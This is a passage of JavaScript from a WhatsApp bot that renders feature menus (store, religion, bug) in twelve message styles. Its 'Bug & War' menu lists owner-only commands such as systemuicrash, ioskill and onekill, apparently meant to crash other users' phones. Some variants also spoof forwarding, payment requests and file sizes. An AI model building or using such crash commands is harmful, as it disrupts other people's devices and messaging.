"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'storemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Store* 」❍
│${setv} ${prefix}*list√*
│${setv} ${prefix}*store√*
│${setv} ${prefix}*shop√*
│${setv} ${prefix}*addlist✓*
│${setv} ${prefix}*dellist✓*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/3iWQsIQ.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/3iWQsIQ.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'religionmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Religon* 」❍
│${setv} ${prefix}*bible√*
│${setv} ${prefix}*quran√*
│${setv} ${prefix}*gita√*
│${setv} ${prefix}*namazchk√*
│${setv} ${prefix}*prophetname√*
│${setv} ${prefix}*prayertime√*
│${setv} ${prefix}*sahihbukhari√*
│${setv} ${prefix}*jamiattirmidhi√*
│${setv} ${prefix}*sunanannasai√*
│${setv} ${prefix}*sunanibnmajah√*
│${setv} ${prefix}*sunanabudawud√*
│${setv} ${prefix}*kisahnabi√*
│${setv} ${prefix}*asmaulhusna√*
│${setv} ${prefix}*duas√*
│${setv} ${prefix}*namaz√*
│${setv} ${prefix}*masnoonduas√*
│${setv} ${prefix}*ayatalkursi√*
│${setv} ${prefix}*niyatnamaz√*
│${setv} ${prefix}*quotesislami√*
│${setv} ${prefix}*assalamualaikum√*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/qRhRO97.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/qRhRO97.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'bugmenu': case 'tech': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Bug & War* 」❍
│${setv} ${prefix}*techandroid✓*
│${setv} ${prefix}*techandroid2✓*
│${setv} ${prefix}*techios✓*
│${setv} ${prefix}*techios2✓*
│${setv} ${prefix}*systemuicrash✓*
│${setv} ${prefix}*techsysui✓*
│${setv} ${prefix}*darlingkill✓*
│${setv} ${prefix}*ioskill✓*
│${setv} ${prefix}*onekill✓*
│${setv} ${prefix}*xgc✓*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/vfFOtcW.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/vfFOtcW.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
